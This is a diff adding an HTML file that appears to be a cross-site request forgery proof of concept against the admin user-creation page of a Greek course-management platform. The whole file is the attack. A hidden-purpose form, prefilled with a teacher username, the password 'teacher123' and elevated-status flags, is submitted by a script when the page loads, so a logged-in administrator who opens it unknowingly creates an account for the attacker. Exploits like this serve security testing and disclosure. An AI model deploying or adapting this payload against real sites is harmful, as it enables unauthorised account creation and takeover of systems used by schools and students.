@@ -1,0 +1,65 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/admin/newuseradmin.php' method='post'>
+  <table width='99%' align='left' class='FormData'>
+  <tbody><tr>
+  <th width='220'>&nbsp;</th>
+  <td><b>Εισαγωγή στοιχείων νέου λογαριασμού εκπαιδευτή</b></td>
+  </tr>
+  <tr>
+  <th class='left'><b>Επώνυμο</b></th>
+  <td><input class='FormData_InputText' type='text' name='nom_form' value='teacher' >&nbsp;(*)</td>
+  </tr>
+  <tr>
+  <th class='left'><b>Όνομα</b></th>
+  <td><input class='FormData_InputText' type='text' name='prenom_form' value='teacher'>&nbsp;(*)</td>
+  </tr>
+  <tr>
+  <th class='left'><b>Όνομα χρήστη (username)</b></th>
+  <td><input class='FormData_InputText' type='text' name='uname' value='teacheruser'>&nbsp;(*)</td>
+  </tr>
+  <tr>
+  <th class='left'><b>Συνθηματικό (password)</b></th>
+  <td><input class='FormData_InputText' type='text' name='password' value='teacher123'></td>
+  </tr>
+  <tr>
+  <th class='left'><b>email</b></th>
+  <td><input class='FormData_InputText' type='text' name='email_form' value='teacher@teacher.gr'>&nbsp;(*)</b></td>
+  </tr>
+  <tr>
+  <th class='left'>Σχολή / Τμήμα</th>
+  <td>
+<select name='department'  class='auth_input'>
+<option value='1'>Τμήμα 1</option>
+<option value='2'>Τμήμα 2</option>
+<option value='4'>Τμήμα 4</option>
+</select>
+</td>
+  </tr>
+  <tr>
+  <th class='left'><b>Σχόλια</b></th>
+  <td><input class='FormData_InputText' type='text' name='comment' value=''>&nbsp;</b></td>
+  </tr>
+  <tr>
+  <th class='left'>Γλώσσα</th>
+  <td>
+<select name='language'  class='auth_input'>
+<option value='el'>Ελληνικά</option>
+<option selected value='en'>English</option>
+<option value='es'>Español</option>
+</select>
+</td></tr>
+  <tr>
+  <th>&nbsp;</th>
+  <td><input class='FormData_InputText' type='text' name='submit' value='teacher123'>
+    <small>Τα πεδία με (*) είναι υποχρεωτικά</small></td>
+  </tr>
+  </tbody>
+  </table>
+  <input type='hidden' name='rid' value=''>
+  <input type='hidden' name='pstatut' value='1'>
+        <input type='hidden' name='auth' value='1' >
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
